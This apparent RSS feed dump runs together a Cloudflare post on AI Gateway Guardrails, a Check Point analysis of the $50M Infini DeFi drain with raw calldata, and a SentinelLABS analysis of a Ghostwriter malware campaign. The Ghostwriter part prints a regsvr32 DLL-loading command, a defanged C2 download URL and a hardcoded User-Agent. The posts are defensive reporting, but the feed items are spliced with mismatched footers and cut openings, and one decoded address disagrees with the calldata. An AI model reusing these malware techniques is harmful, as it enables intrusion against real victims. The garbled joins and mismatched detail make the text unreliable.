settings with just a few clicks. &lt;/p&gt;
          &lt;figure&gt;

          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Figure 1. AI Gateway settings with Guardrails turned on, displaying selected hazard categories for prompts and responses, with flagged categories in orange and blocked categories in red&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;Within the AI Gateway settings, developers can configure:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Guardrails&lt;/b&gt;: Enable or disable content moderation as needed.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Evaluation scope&lt;/b&gt;: Select whether to moderate user prompts, model responses, or both.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Hazard categories&lt;/b&gt;: Specify which categories to monitor and determine whether detected inappropriate content should be blocked or flagged.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3QnhWk1vn1SvFsKICvb9Rd/99f0cfc6e62b1f70db1d102277d73f83/image9.png" /&gt;

Advanced settings of Guardrails with granular moderation controls for different hazard categories&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;By implementing these guardrails within AI Gateway, developers can focus on innovation, knowing that risks are proactively mitigated and their AI applications are operating responsibly.&lt;/p&gt;&lt;h4&gt;Leveraging Llama Guard on Workers AI&lt;/h4&gt;&lt;p&gt;The Guardrails feature is currently powered by &lt;a href="https://ai.meta.com/research/publications/llama-guard-llm-based-input-output-safeguard-for-human-ai-conversations/"&gt;&lt;u&gt;Llama Guard&lt;/u&gt;&lt;/a&gt;, Meta’s open-source content moderation and safety tool, designed to detect harmful or unsafe content in both user inputs and AI-generated outputs. It provides real-time filtering and monitoring, ensuring responsible AI usage, reducing risk, and improving trust in AI-driven applications. Notably, organizations like &lt;a href="https://mlcommons.org/"&gt;&lt;u&gt;ML Commons&lt;/u&gt;&lt;/a&gt; use Llama Guard to evaluate the safety of foundation models. &lt;/p&gt;&lt;p&gt;Llama Guard can be used to provide protection over a wide range of content such as violence and sexually explicit material. It also helps you safeguard sensitive data as outlined in the OWASP, like addresses, Social Security numbers, and credit card details. Specifically, Guardrails on AI Gateway utilizes the &lt;a href="https://github.com/meta-llama/PurpleLlama/blob/main/Llama-Guard3/8B/MODEL_CARD.md"&gt;&lt;u&gt;Llama Guard 3 8B&lt;/u&gt;&lt;/a&gt; model hosted on &lt;a href="https://developers.cloudflare.com/workers-ai/"&gt;&lt;u&gt;Workers AI&lt;/u&gt;&lt;/a&gt; — Cloudflare’s serverless, GPU-powered inference engine. Workers AI is uniquely qualified for this task because it operates on GPUs distributed across Cloudflare’s network, ensuring low-latency inference and rapid content evaluation. We plan to add additional models to power the Guardrails feature to Workers AI in the future. &lt;/p&gt;&lt;p&gt;Using Guardrails incurs &lt;a href="https://developers.cloudflare.com/workers-ai/models/llama-guard-3-8b/"&gt;&lt;u&gt;Workers AI usage&lt;/u&gt;&lt;/a&gt;, and that usage is reflected in your &lt;a href="https://dash.cloudflare.com/?to=/:account/ai/workers-ai"&gt;&lt;u&gt;Workers AI dashboard&lt;/u&gt;&lt;/a&gt;, allowing developers to track their inference consumption effectively. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;How it works &lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#how-it-works"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Functioning as a proxy between users and AI models, AI Gateway intercepts and inspects all interactions—both user prompts and model responses—for potentially harmful content.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/kzup1z7NTP4qkMXWgh8ns/b85afdfd8328f0f8c28e42058c305ecb/image5.jpg" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Figure 3. Workflow diagram of Guardrails in AI Gateway, illustrating how prompts and responses are evaluated, along with the outcomes when content is deemed safe or unsafe&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;When a user enters a prompt, AI Gateway runs that prompt through Llama Guard on Workers AI. Behind the scenes, AI Gateway utilizes the &lt;a href="https://developers.cloudflare.com/ai-gateway/integrations/worker-binding-methods/"&gt;&lt;u&gt;AI Binding&lt;/u&gt;&lt;/a&gt;, making it seamless to connect AI Gateway to Cloudflare &lt;a href="https://developers.cloudflare.com/workers/"&gt;&lt;u&gt;Workers&lt;/u&gt;&lt;/a&gt; and &lt;a href="https://developers.cloudflare.com/workers-ai/"&gt;&lt;u&gt;Workers AI&lt;/u&gt;&lt;/a&gt;. To provide better observability, requests to Workers AI through AI Gateway all include the &lt;code&gt;eventID&lt;/code&gt; from the original request. This ensures that each request can be linked to its corresponding safety evaluations, allowing for efficient log grouping and traceability of AI interactions. &lt;/p&gt;&lt;p&gt;Depending on the configured settings, AI Gateway can either flag the prompt while still allowing the request to pass through to the AI model, or block the prompt entirely, preventing it from reaching the model. Blocking harmful prompts in this way not only enhances safety, but also reduces costs by preventing unnecessary processing and token consumption. If a prompt passes the safety check, it’s forwarded to the AI model.&lt;/p&gt;&lt;p&gt;Let’s see an example of a prompt blocked by Guardrails. In this example, the Guardrails settings have been turned on for user prompts and configured to block for multiple categories, including “Non-Violent Crimes”. The user has asked OpenAI’s &lt;code&gt;gpt-4o-mini &lt;/code&gt;model to “Teach me how to steal company data without being detected”. Instead of returning a response from the model, Guardrails has identified this prompt to include content around “Non-Violent Crimes” and blocked it, returning the message “Prompt blocked due to security configurations”. &lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/67JO7yPZ1gXOyX8u6Cx7CN/09b8ae7c7080fe7ada50bab70de4ead9/image9.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Figure 4. AI Gateway log displaying a blocked prompt classified under “Non-Violent Crimes”, with an error message indicating the prompt was blocked due to security configurations&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;AI Gateway determined this prompt was unsafe because the response from Workers AI Llama Guard indicated that category S2, Non-Violent Crimes, was &lt;code&gt;safe: false&lt;/code&gt;. Since Guardrails was configured to block when the “Non-Violent Crimes” hazard category was detected, AI Gateway failed the request and did not send it to OpenAI. As a result, the request was unsuccessful and no token usage was incurred.&lt;/p&gt;
          &lt;figure&gt;
          &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3U401FlyK3XxiySamMfNZv/0a25e547a247f352675f2d9bf4fdb9e0/image4.png" /&gt;
          &lt;/figure&gt;&lt;p&gt;&lt;sup&gt;&lt;i&gt;Figure 5. Guardrails log of a Llama Guard 3 8B request from Workers AI, flagging category S2, as Non-Violent Crimes, with the response indicating safe: false&lt;/i&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;AI Gateway also inspects AI model responses before they reach the user, again evaluating them against the configured safety settings. Safe responses are delivered to the user. However, if any hazardous content is detected, the response is either flagged or blocked and logged in AI Gateway. &lt;/p&gt;&lt;p&gt;AI Gateway leverages specialized AI models trained to recognize various forms of harmful content to ensure only safe and appropriate information is shown to users. Currently, Guardrails only works with text-based AI models. &lt;/p&gt;
          &lt;div&gt;
            &lt;h3&gt;Deploy with confidence&lt;/h3&gt;
            &lt;a href="https://blog.cloudflare.com/tag/security/rss#deploy-with-confidence"&gt;
              
            &lt;/a&gt;
          &lt;/div&gt;
        &lt;p&gt;Safely deploying AI in today’s dynamic landscape requires acknowledging that while AI models are powerful, they are also inherently non-deterministic. By leveraging Guardrails within AI Gateway, you gain:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Consistent moderation&lt;/b&gt;: Uniform moderation layer that works across models and providers.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Enhanced safety and user trust&lt;/b&gt;: Proactively protect users from harmful or inappropriate interactions.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Flexibility and control over allowed content: &lt;/b&gt;Specify which categories to monitor and choose between flagging or outright blocking&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;b&gt;Auditing and compliance capabilities&lt;/b&gt;: Stay ahead of evolving regulatory requirements with logs of user prompts, model responses, and enforced guardrails.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;If you aren't yet using AI Gateway, Llama Guard is also available directly through Workers AI and will be available directly in the Cloudflare WAF in the near future. &lt;/p&gt;&lt;p&gt;Looking ahead, we plan to expand Guardrails’ capabilities further, to allow users to create their own classification categories, and to include protections against prompt injection and sensitive data exposure.

&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/how-an-attacker-drained-50m-from-a-defi-protocol-through-role-escalation/"&gt;How an Attacker Drained $50M from a DeFi Protocol Through Role Escalation &lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;em&gt;By: Dikla Barda, Roaman Zaikin &amp;amp; Oded Vanunu&amp;nbsp;&lt;/em&gt;&lt;/p&gt;



&lt;p&gt;After reviewing the off-chain &lt;a href="https://docsend.com/view/s/rmdi832mpt8u93s7"&gt;forensic report&lt;/a&gt;, we can now provide additional insights into the Bybit attack&lt;br /&gt;mechanism.&lt;/p&gt;



&lt;p&gt;Security researchers have determined that hackers injected malicious JavaScript directly into Safe&amp;#8217;s&lt;br /&gt;online infrastructure hosted on AWS. The code was specifically designed to activate only when&lt;br /&gt;interacting with Bybit&amp;#8217;s contract address, allowing it to remain undetected by regular users.&lt;br /&gt;The JavaScript manipulation modified transaction data behind the scenes:&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;When Bybit signers accessed the interface, the code identified target addresses&lt;/li&gt;
&lt;/ul&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;It silently modified critical transaction parameters including recipient address and operation&lt;br /&gt;type&lt;/li&gt;



&lt;li&gt;It preserved the appearance of legitimacy by displaying the original transaction details to signers&lt;br /&gt;Just two minutes after successfully draining $1.4 billion in assets, the hackers removed all traces of themalicious code from Safe&amp;#8217;s infrastructure.&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;This finding confirms our assessment that this attack sets a new precedent in crypto security by&lt;br /&gt;bypassing a multisig cold wallet through sophisticated UI manipulation, further proving that multisigs&lt;br /&gt;and cold wallets are not automatically secure when the interface layer can be compromised.&lt;/p&gt;



&lt;p&gt;On February 21, Check Point Blockchain Threat Intel System observed a sophisticated attack on a DeFi protocol, &lt;strong&gt;Infini&lt;/strong&gt;. &lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-31185" height="367" src="https://research.checkpoint.com/wp-content/uploads/2025/02/image-3-1024x367.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p&gt;Infini is a digital banking platform in the crypto space that offers its users savings yields and other financial services. The platform aims to make crypto assets more accessible practical for everyday transactions.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Unfortunately, this project recently suffered a security breach that targeted its yield management system, resulting in the loss of approximately 50 million USDC. The attacker exploited compromised private keys, carefully manipulated access controls, and executed a precise sequence of transactions to drain funds.&amp;nbsp;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Here, we’ll break down the heist step by step. &lt;/p&gt;



&lt;p&gt;&lt;strong&gt;The Compromised Private Key&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;The attack began with transactions&amp;nbsp; from address 0xc49b5e5B9DA66B9126c1a62e9761E6b2147DE3E1, which held administrative privileges in the protocol. Infini has stated that they believe this private key may have been compromised.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Private key security is one of the most challenging aspects of blockchain security. Even with best practices in place, sophisticated attackers can sometimes gain access through various vectors, including phishing, malware, or other techniques. Without a full investigation, it&amp;#8217;s premature to draw conclude exactly how the administrative access was obtained.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;With this key, the attacker could sign transactions as if they were the legitimate owners—a critical first step that gave them initial access to the protocol.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Exploiting the Role-Based Access Control System&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Looking at the decompiled contract code, we can see the core function that determines role authorization:&amp;nbsp;&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-31181" height="71" src="https://research.checkpoint.com/wp-content/uploads/2025/02/image-1024x71.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p&gt;The compromised address&amp;nbsp; had admin privileges, which allowed the attacker to grant the REDEEMER_ROLE to themselves using the stolen key.&amp;nbsp;&lt;/p&gt;



&lt;figure class="wp-block-image size-full"&gt;&lt;img alt="" class="wp-image-31183" height="182" src="https://research.checkpoint.com/wp-content/uploads/2025/02/image-1.png" width="750" /&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;Setting Up the Extraction Path&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Before funds could be withdrawn, the attacker needed to register their address as a valid destination. Looking at the contract code, we can see the critical function:&amp;nbsp;&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-31182" height="71" src="https://research.checkpoint.com/wp-content/uploads/2025/02/image-1024x71.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p&gt;This function registers an address in the map_4 mapping, which the withdrawal function checks during execution.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;The attacker used the compromised key to call this function and register their address as a valid destination, setting up the path for the funds to exit the protocol.&amp;nbsp;&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-31184" height="851" src="https://research.checkpoint.com/wp-content/uploads/2025/02/image-2-1024x851.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p&gt;&lt;strong&gt;The Withdrawal Function&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;The heart of this exploit was the ability to call the token redemption function, which has the hex signature 0xcfda09ef. Let&amp;#8217;s examine this critical function:&amp;nbsp;&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-31187" height="905" src="https://research.checkpoint.com/wp-content/uploads/2025/02/image-5-1024x905.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p&gt;This function works by:&amp;nbsp;&lt;/p&gt;



&lt;ol class="wp-block-list" start="1"&gt;
&lt;li&gt;Checking that the caller has the REDEEMER_ROLE&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="2"&gt;
&lt;li&gt;Verifying the token is valid, and the destination is registered&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="3"&gt;
&lt;li&gt;Checking if the contract has enough tokens directly&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="4"&gt;
&lt;li&gt;If not, pulling tokens from the specified strategy&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="5"&gt;
&lt;li&gt;Finally, transferring tokens to the destination address&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;With the REDEEMER_ROLE and their address registered in map_4, the attacker could now call this function to drain funds to their&amp;nbsp; wallet.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;The Execution&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;The attack culminated in a transaction that called the 0xcfda09ef function with these parameters:&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Copy&amp;nbsp;&lt;/p&gt;



&lt;p&gt;0xcfda09ef000000000000000000000000a0b86991c6218b36c1d19d4a2e9eb0ce3606eb480000000000000000000000000000000000000000000000000000229dc42982570000000000000000000000003ac96134fb0e42a52d33045aee50b89790f05ed0000000000000000000000000e0e83f21d5b6da61c9cf75d3b89fbcacfbfde32700000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000000&amp;nbsp;&lt;/p&gt;



&lt;p&gt;When decoded:&amp;nbsp;&lt;/p&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Token: 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 (USDC)&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Amount: 0x0000000000000000000000000000000000000000000000000000229dc4298257&amp;nbsp;&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Destination: 0x3ac96134fb0e42a52d33045aee50b89790f05ed0 (Attacker-controlled)&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Strategy: 0x0e0e83f21d5b6da61c9cf75d3b89fbcacfbfde327 (Yield strategy holding funds)&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;ul class="wp-block-list"&gt;
&lt;li&gt;Extra data: Empty byte array&amp;nbsp;&lt;/li&gt;
&lt;/ul&gt;



&lt;p&gt;&lt;strong&gt;The Bounty Offer&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;Following the attack, Infini took an approach that has become increasingly common in the DeFi space. The protocol team sent an on-chain message to the attacker, offering a bounty of 20% of the stolen funds (approximately 10 million USDC) if the remaining funds were returned.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;The message was embedded in a transaction to the attacker&amp;#8217;s wallet and read:&amp;nbsp;&lt;/p&gt;



&lt;figure class="wp-block-image size-large"&gt;&lt;img alt="" class="wp-image-31186" height="372" src="https://research.checkpoint.com/wp-content/uploads/2025/02/image-4-1024x372.png" width="1024" /&gt;&lt;/figure&gt;



&lt;p&gt;This approach, sometimes called a &amp;#8220;white hat agreement&amp;#8221; or &amp;#8220;bug bounty after the fact,&amp;#8221; has occasionally been successful in recovering funds from attacks where the exploiter is primarily motivated by financial gain rather than causing harm to the protocol. The strategy acknowledges that legal recovery of crypto assets can be difficult and time-consuming, while offering the attacker a legitimate way to profit from their discovery without risking legal consequences.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;As of the time of writing, it remains to be seen whether the attacker will accept this offer.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;&lt;strong&gt;Security Lessons&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;This attack highlights several critical security considerations for DeFi protocols:&amp;nbsp;&lt;/p&gt;



&lt;ol class="wp-block-list" start="1"&gt;
&lt;li&gt;&lt;strong&gt;Private Key Security&lt;/strong&gt;: This compromise was caused by a stolen private key. Hardware wallets, multi-signature schemes, and proper key management are essential.&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="2"&gt;
&lt;li&gt;&lt;strong&gt;Role Separation&lt;/strong&gt;: The compromised account had both administrative access to grant roles and could add destination addresses. Better separation of duties might have mitigated the impact.&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="3"&gt;
&lt;li&gt;&lt;strong&gt;Time-Locks and Monitoring&lt;/strong&gt;: Implementation of time-locks for sensitive operations and active monitoring could have detected and potentially prevented the attack before completion.&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="4"&gt;
&lt;li&gt;&lt;strong&gt;Withdrawal Limits&lt;/strong&gt;: The protocol lacked maximum withdrawal limits, allowing the attacker to drain funds in a single transaction.&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;&lt;strong&gt;Conclusion&lt;/strong&gt;&amp;nbsp;&lt;/p&gt;



&lt;p&gt;This case study demonstrates how seemingly isolated security vulnerabilities can be chained together into devastating attacks. The attacker methodically:&amp;nbsp;&lt;/p&gt;



&lt;ol class="wp-block-list" start="1"&gt;
&lt;li&gt;Obtained a private key with administrative privileges&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="2"&gt;
&lt;li&gt;Granted themselves the REDEEMER_ROLE&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="3"&gt;
&lt;li&gt;Registered their address as a valid destination&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;ol class="wp-block-list" start="4"&gt;
&lt;li&gt;Called the withdrawal function to drain approximately 50 million USDC&amp;nbsp;&lt;/li&gt;
&lt;/ol&gt;



&lt;p&gt;Each step built upon the previous one, ultimately leading to a complete protocol compromise. While the code contained various security checks, the fundamental issue was that once the private key was compromised, the role-based system could be manipulated from within.&amp;nbsp;&lt;/p&gt;



&lt;p&gt;This attack reinforces that security is only as strong as its weakest link, and sophisticated attackers will exploit multiple small vulnerabilities to achieve their goals.&amp;nbsp;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;SentinelLABS has observed a campaign targeting opposition activists in Belarus as well as Ukrainian military and government organizations.&lt;/li&gt;
&lt;li&gt;The campaign has been in preparation since July-August 2024 and entered the active phase in November-December 2024.&lt;/li&gt;
&lt;li&gt;Recent malware samples and command-and-control (C2) infrastructure activity indicate that the operation remains active in recent days.&lt;/li&gt;
&lt;li&gt;SentinelLABS assesses that this cluster of threat activity is an extension of the long-running Ghostwriter campaign identified in previous public reporting.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;Ghostwriter | Background&lt;/h2&gt;
&lt;p&gt;Ghostwriter is a long-running campaign likely active since 2016 and subsequently described in various public reports throughout 2020 to 2024. The actor behind Ghostwriter campaigns is closely linked with Belarusian government espionage efforts, while most commonly reported under the APT names &lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/unc1151-linked-to-belarus-government/" rel="noopener noreferrer" target="_blank"&gt;UNC1151&lt;/a&gt; (Mandiant) or &lt;a href="https://cert.gov.ua/search/UAC-0057" rel="noopener noreferrer" target="_blank"&gt;UAC-0057&lt;/a&gt; (CERT-UA). Some public reports may use the term &amp;#8220;Ghostwriter APT&amp;#8221; interchangeably to refer to both the threat actor and its associated campaigns.&lt;/p&gt;
&lt;p&gt;Previous &lt;a href="https://www.cardiff.ac.uk/__data/assets/pdf_file/0005/2699483/Ghostwriter-Report-Final.pdf" rel="noopener noreferrer" target="_blank"&gt;research&lt;/a&gt; on the evolution of Ghostwriter noted how it operated successfully across a range of platforms, blending information manipulation with hacking to target a number of European countries. Reporting throughout 2022 to 2024 described &lt;a href="https://cert.gov.ua/article/6280159" rel="noopener noreferrer" target="_blank"&gt;activity&lt;/a&gt; in which malicious Excel documents were used to deliver PicassoLoader and Cobalt Strike payloads. Observed document lures were themed around issues pertaining to the Ukraine military and the &lt;a href="https://cyble.com/blog/unc1151-strikes-again-unveiling-their-tactics-against-ukraines-ministry-of-defence/" rel="noopener noreferrer" target="_blank"&gt;likely targeting&lt;/a&gt; of the Ministry of Defense.&lt;/p&gt;
&lt;p&gt;SentinelLABS has observed new activity with multiple weaponized Excel documents containing lures pertaining to the interests of the Ukraine government, the Ukraine military and domestic Belarusian opposition. While some of the TTPs we have observed overlap with previous reporting, others are new, including adaptations of previously observed payloads such as PicassoLoader.&lt;/p&gt;
&lt;h2&gt;Weaponized XLS 1 | &amp;#8220;Political Prisoners in Minsk Courts&amp;#8221;&lt;/h2&gt;
&lt;p&gt;SentinelLABS analyzed an attack that started with a Google Drive shared document landing in the target’s inbox. The email originated from an account using the name “Vladimir Nikiforech” (&lt;code&gt;vladimir.nikiforeach@gmail[.]com&lt;/code&gt;). The email link pointed to a downloadable RAR archive, which according to the internal timestamps was created on 2025-01-14 00:47:54, containing a malicious Excel workbook (&lt;code&gt;ebb30fd99c2e6cbae392c337df5876759e53730d&lt;/code&gt;) with the file name &lt;code&gt;политзаключенные(по судам минска).xls&lt;/code&gt; (“Political prisoners (across courts of Minsk).xls”).&lt;/p&gt;
&lt;p&gt;The title of the lure indicates an interesting shift in Ghostwriter targeting. Although attribution for the 2021 Ghostwriter campaign &lt;a href="https://www.cardiff.ac.uk/__data/assets/pdf_file/0005/2699483/Ghostwriter-Report-Final.pdf" rel="noopener noreferrer" target="_blank"&gt;pointed to&lt;/a&gt; the Belarus state, this is the first time we have seen lures directly aimed at Belarus government opposition. The timing of the attack could have been motivated by the presidential election that &lt;a href="https://en.wikipedia.org/wiki/2025_Belarusian_presidential_election" rel="noopener noreferrer" target="_blank"&gt;took place&lt;/a&gt; shortly after on Jan 26, 2025.&lt;/p&gt;
&lt;p&gt;The XLS document contains an obfuscated VBA macro which is activated when the document is opened and the user allows Office macros to run.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114850" style="width: 1837px;"&gt;&lt;img alt="Obfuscated macro inside the XLS spreadsheet" class="size-full wp-image-114850" height="752" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_3.jpg" width="1837" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114850"&gt;Obfuscated macro inside the XLS spreadsheet&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;On execution, the macro writes a file to &lt;code&gt;%Temp%\Realtek(r)Audio.dll&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;The DLL file is loaded with the following command line invocation:&lt;/p&gt;
&lt;pre&gt;
C:\Windows\System32\regsvr32.exe /u /s "C:\Temp\Realtek(r)Audio.dll”
&lt;/pre&gt;
&lt;p&gt;This starts the standard Windows process &lt;code&gt;regsvr32.exe&lt;/code&gt;, which calls the &lt;code&gt;DllUnregisterServer&lt;/code&gt; function implemented inside the DLL; the function then loads and executes the .NET assembly described next.&lt;/p&gt;
&lt;p&gt;Analysis of &lt;code&gt;Dwnldr.dll&lt;/code&gt; shows that it is a DLL file with a .NET assembly embedded inside. The file is protected with &lt;a href="https://mkaring.github.io/ConfuserEx/" rel="noopener noreferrer" target="_blank"&gt;ConfuserEx&lt;/a&gt; &amp;#8211; a publicly available tool that helps to obfuscate .NET programs and observed in previous Ghostwriter campaigns.&lt;/p&gt;
&lt;p&gt;The DLL file hosts a payload that appears to be a simplified variant of PicassoDownloader, a malware family also linked to Ghostwriter activity. The internal filename (&lt;code&gt;Dwnldr.dll&lt;/code&gt;) was previously used by the Ghostwriter threat actor; however, this variant bears only high-level similarities to previous versions, with significant changes to the underlying code, possibly to make it a cheaper and more expendable tool.&lt;/p&gt;
&lt;p&gt;As a part of application protection provided by the obfuscator, the Downloader creates a copy of itself in memory, and then modifies it. It does so by decrypting additional code of the assembly. It also uses a clever evasion technique, altering its own PE header in memory and breaking internal links to the .NET assembly. This makes it impossible for security products to parse it as a .NET module.&lt;/p&gt;
&lt;p&gt;During code execution, after the protection layer passes control to core functionality, the Downloader writes a decoy Excel workbook file to &lt;code&gt;%AppData%\Roaming\Microsoft\temp.xlsx&lt;/code&gt; and downloads additional file(s) from the Web.&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;temp.xlsx&lt;/code&gt; decoy file (&lt;code&gt;18151b3801bd716b5a33cfc85dbdc4ba84a00314&lt;/code&gt;) is immediately opened in Excel in an attempt to make the victim believe that it contains the original content of the &lt;code&gt;политзаключенные (по судам минска).xls&lt;/code&gt; file.&lt;/p&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114854" style="width: 1999px;"&gt;&lt;img alt="Decoy document containing lists of people with criminal charges, prosecutors’ and judges’ names" class="size-full wp-image-114854" height="803" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_11.jpg" width="1999" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114854"&gt;Decoy document containing lists of people with criminal charges, prosecutors’ and judges’ names&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;The spreadsheet contains the names of people with criminal charges along with the names of prosecutors and judges: content that invites the reader to believe it could be leaked from a government source. However, the information was already in the public domain and can be found on the website of a proscribed Belarusian human rights organization, &lt;a href="https://prisoners.spring96.org/ru/list" rel="noopener noreferrer" target="_blank"&gt;Spring96&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;Once the decoy Excel file is opened, the Downloader attempts to fetch the next stage from the following URL:&lt;/p&gt;
&lt;pre&gt;
https://everythingandthedog[.]shop/petsblog/2020/2/25/tips-for-taking-difficult-dogs-on-a-walk.jpg
&lt;/pre&gt;
&lt;figure class="wp-caption aligncenter" id="attachment_114852" style="width: 720px;"&gt;&lt;img alt="The JPG image file fetched from the C2" class="size-full wp-image-114852" height="960" src="https://www.sentinelone.com/wp-content/uploads/2025/02/Ghostwriter_13.jpg" width="720" /&gt;&lt;figcaption class="wp-caption-text" id="caption-attachment-114852"&gt;The JPG image file fetched from the C2&lt;/figcaption&gt;&lt;/figure&gt;
&lt;p&gt;We note that the &lt;code&gt;.shop&lt;/code&gt; top level domain was also reported in other Ghostwriter activity seen in 2024.&lt;/p&gt;
&lt;p&gt;When the malware issues the HTTP request, it uses a hardcoded User-Agent string:&lt;/p&gt;
&lt;pre&gt;
Mozilla/5.0 (&lt;b&gt;Macintosh; Intel Mac OS X 10_15_7&lt;/b&gt;) AppleWebKit/555.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36
&lt;/pre&gt;
